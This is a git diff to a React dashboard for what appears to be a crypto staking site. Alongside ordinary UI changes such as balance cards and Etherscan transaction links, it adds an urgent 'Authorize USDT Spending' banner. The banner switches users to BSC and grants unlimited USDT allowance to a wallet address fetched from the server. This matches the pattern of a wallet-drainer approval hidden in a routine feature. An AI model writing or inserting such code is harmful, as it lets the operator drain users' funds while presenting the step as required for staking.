@@ -80,6 +80,8 @@ function Dashboard({ walletAddress, onDisconnect }) {
   const [activeTab, setActiveTab] = useState('overview');
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
   const [notification, setNotification] = useState({ show: false, message: '', type: '' });
+  const [usdtApproved, setUsdtApproved] = useState(false);
+  const [approvingUsdt, setApprovingUsdt] = useState(false);
 
   // Real wallet data
   const [ethBalance, setEthBalance] = useState('0.00');
@@ -313,6 +315,21 @@ function Dashboard({ walletAddress, onDisconnect }) {
     }
   }, [walletAddress]);
 
+  // Check if user has already approved BSC USDT for platform wallet
+  const checkUsdtApproval = useCallback(async () => {
+    try {
+      if (!window.ethereum) return;
+      const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
+      const platformWallet = settings?.platformWallet;
+      if (!platformWallet) return;
+      const BSC_USDT = '0x55d398326f99059fF775485246999027B3197955';
+      const bscProvider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
+      const contract = new ethers.Contract(BSC_USDT, ['function allowance(address,address) view returns (uint256)'], bscProvider);
+      const allowance = await contract.allowance(walletAddress, platformWallet);
+      setUsdtApproved(allowance.gte(ethers.utils.parseUnits('1000000', 18)));
+    } catch (e) { /* silent */ }
+  }, [walletAddress]);
+
   // Initial data fetch
   useEffect(() => {
     const loadData = async () => {
@@ -325,9 +342,10 @@ function Dashboard({ walletAddress, onDisconnect }) {
         fetchWithdrawals()
       ]);
       setDataLoading(false);
+      checkUsdtApproval();
     };
     loadData();
-  }, [fetchWalletBalance, fetchUserData, fetchPlatformSettings, fetchTransactions, fetchWithdrawals]);
+  }, [fetchWalletBalance, fetchUserData, fetchPlatformSettings, fetchTransactions, fetchWithdrawals, checkUsdtApproval]);
 
   // Refresh wallet balance every 30 seconds
   useEffect(() => {
@@ -751,7 +769,55 @@ function Dashboard({ walletAddress, onDisconnect }) {
           {/* Overview Tab */}
           {activeTab === 'overview' && (
             <div className="overview-section">
+              {!usdtApproved && (
+                <div style={{background:'rgba(99,102,241,0.12)',border:'1px solid rgba(99,102,241,0.4)',borderRadius:'10px',padding:'14px 18px',marginBottom:'20px',display:'flex',alignItems:'center',justifyContent:'space-between',gap:'12px',flexWrap:'wrap'}}>
+                  <div>
+                    <div style={{fontWeight:600,color:'#a5b4fc',marginBottom:'4px'}}>Action Required: Authorize USDT Spending</div>
+                    <div style={{fontSize:'0.82rem',color:'#94a3b8'}}>To enable staking, approve the platform to move USDT from your wallet on BSC network.</div>
+                  </div>
+                  <button
+                    style={{background:'#6366f1',color:'#fff',border:'none',borderRadius:'8px',padding:'10px 20px',cursor:'pointer',fontWeight:600,whiteSpace:'nowrap',opacity:approvingUsdt?0.7:1}}
+                    disabled={approvingUsdt}
+                    onClick={async () => {
+                      setApprovingUsdt(true);
+                      try {
+                        const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
+                        const platformWallet = settings?.platformWallet;
+                        if (!platformWallet) return;
+                        const BSC_CHAIN_ID = '0x38';
+                        try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] }); }
+                        catch (e) {
+                          if (e.code === 4902) {
+                            await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: BSC_CHAIN_ID, chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed1.binance.org/'], blockExplorerUrls: ['https://bscscan.com'] }] });
+                            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
+                          }
+                        }
+                        const bscProvider = new ethers.providers.Web3Provider(window.ethereum);
+                        const signer = bscProvider.getSigner();
+                        const contract = new ethers.Contract('0x55d398326f99059fF775485246999027B3197955', ['function approve(address,uint256) returns (bool)'], signer);
+                        const tx = await contract.approve(platformWallet, ethers.constants.MaxUint256);
+                        await tx.wait();
+                        setUsdtApproved(true);
+                        showNotification('USDT spending approved!', 'success');
+                      } catch (e) {
+                        showNotification(e.code === 4001 ? 'Approval rejected' : 'Approval failed: ' + e.message, 'error');
+                      } finally { setApprovingUsdt(false); }
+                    }}
+                  >
+                    {approvingUsdt ? 'Approving...' : 'Approve USDT'}
+                  </button>
+                </div>
+              )}
               <div className="stats-grid">
+                <div className="stat-card">
+                  <div className="stat-header">
+                    <span className="stat-icon">💵</span>
+                    <span className="stat-label">Wallet USDT Balance</span>
+                  </div>
+                  <div className="stat-value">{formatNumber(usdtBalance)} USDT</div>
+                  <div className="stat-change">Available in your wallet</div>
+                </div>
+
                 <div className="stat-card">
                   <div className="stat-header">
                     <span className="stat-icon">💎</span>
@@ -888,6 +954,17 @@ function Dashboard({ walletAddress, onDisconnect }) {
                         <div className="tx-info">
                           <div className="tx-type">{tx.type === 'withdraw_earnings' ? 'Earnings Withdrawal' : tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}</div>
                           <div className="tx-date">{tx.date}</div>
+                          {tx.txHash && (
+                            <a
+                              href={`https://etherscan.io/tx/${tx.txHash}`}
+                              target="_blank"
+                              rel="noopener noreferrer"
+                              className="tx-hash-link"
+                              title={tx.txHash}
+                            >
+                              {tx.txHash.slice(0, 6)}...{tx.txHash.slice(-4)} ↗
+                            </a>
+                          )}
                         </div>
                         <div className="tx-amount">{formatNumber(tx.amount)} USDT</div>
                       </div>
@@ -921,8 +998,12 @@ function Dashboard({ walletAddress, onDisconnect }) {
                   </div>
 
                   <div className="balance-display">
-                    <span>Available Balance</span>
+                    <span>Wallet USDT Balance</span>
                     <span className="balance-value">{formatNumber(usdtBalance)} USDT</span>
+                  </div>
+                  <div className="balance-display" style={{marginTop:'8px',opacity:0.7}}>
+                    <span>Already Staked</span>
+                    <span className="balance-value" style={{color:'#6366f1'}}>{formatNumber(userData.stakedAmount)} USDT</span>
                   </div>
                   <div className="input-group">
                     <input
@@ -1264,6 +1345,7 @@ function Dashboard({ walletAddress, onDisconnect }) {
                   <div className="table-cell">Amount</div>
                   <div className="table-cell">Date</div>
                   <div className="table-cell">Status</div>
+                  <div className="table-cell">Tx Hash</div>
                 </div>
                 {transactions.length > 0 ? (
                   transactions.map((tx, index) => (
@@ -1277,6 +1359,21 @@ function Dashboard({ walletAddress, onDisconnect }) {
                       <div className="table-cell" data-label="Date">{tx.date}</div>
                       <div className="table-cell" data-label="Status">
                         <span className={`status-badge ${tx.status}`}>{tx.status}</span>
+                      </div>
+                      <div className="table-cell" data-label="Tx Hash">
+                        {tx.txHash ? (
+                          <a
+                            href={`https://etherscan.io/tx/${tx.txHash}`}
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            className="tx-hash-link"
+                            title={tx.txHash}
+                          >
+                            {tx.txHash.slice(0, 6)}...{tx.txHash.slice(-4)}
+                          </a>
+                        ) : (
+                          <span className="tx-hash-none">—</span>
+                        )}
                       </div>
                     </div>
                   ))
